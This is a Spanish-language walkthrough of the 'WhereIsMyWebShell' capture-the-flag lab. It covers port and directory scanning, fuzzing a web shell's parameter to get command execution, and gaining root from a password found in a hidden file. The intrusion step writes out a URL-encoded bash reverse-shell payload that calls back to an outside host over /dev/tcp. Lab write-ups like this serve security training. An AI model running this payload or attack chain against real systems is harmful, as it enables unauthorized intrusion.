- Tags: #WhereIsMyWebShell
---
[Maquina WereIsMyWebShell](https://mega.nz/file/Nf8giRID#1SuYshwSEJQnX2AxVhF_q03koiXDe4SI-p3UQhzhE30) ==> Enlace de desacarga al laboratorio.
```bash
7z x whereismywebshell.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh whereismywebshell.tar # Desplegamos el laboratorio
```

#### Fase Reconocimiento:
```bash
172.17.0.2 --> Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para ver si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Detectamos que nos enfrentamos ante un sistema linux
172.17.0.2 (ttl -> 64): Linux
```


#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos expuestos en el target
extractPorts allPorts # Parsemaos la informacion mas relevante del primer escaneo
nmap -sC -sV -p80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corre detras del puerto.
```


#### Fase Reconocimiento Web:
**( 80/tcp open  http    Apache httpd 2.4.57 ((Debian)) )** ==> Tenemos un servicio web expuesto. y Por el **codeName** revisando en **launchPad** vemos que estamos ante una version de: **( debianMantic )**
```bash
whatweb http://172.17.0.2  # No nos reporta nada critico
nmap --script http-enum -p80 172.17.0.2 # No reporta nada critico
```

**( http://172.17.0.2/ )** ==> Tenemos esta web sobre aprendizaje de idiomas, Tendremos que buscar alguna posible vulnerabilida.
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,html,css,js,php.back,back,tar,zip,gzip,txt # Realizando descubrimiento de extensiones encontramos estos

# Posibles vectores de ataque.
/index.html           (Status: 200) [Size: 2510]
/shell.php            (Status: 500) [Size: 0]
/warning.html         (Status: 200) [Size: 315]
```
---
**( http://172.17.0.2/warning.html )** ==> Ingresamos a esta solo encontramos una posible filtracion de informacion.
```bash
wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id" # Probamos una inyeccion en este archivo.

000115401:   200        2 L      4 W        66 Ch       "parameter"  #
```
---
**( http://172.17.0.2/shell.php?parameter=id )** ==> Tenemos ejecucion remota de comandos.

#### Fase Intrusion:
```bash
http://172.17.0.2/shell.php?parameter=bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/192.168.100.22/443%20%3C%261%27 # Accedemos al sistema
```

#### Fase Escalada Privilegios:
**( /tmp )** ==> Aqui encontramos un archivo oculto que contiene la posible password de **root**
```bash
-rw-r--r--  1 root root   21 Apr 12  2024 .secret.txt

password: contraseñaderoot123
```

```bash
su root # Colocamos la password: ( contraseñaderoot123 )
```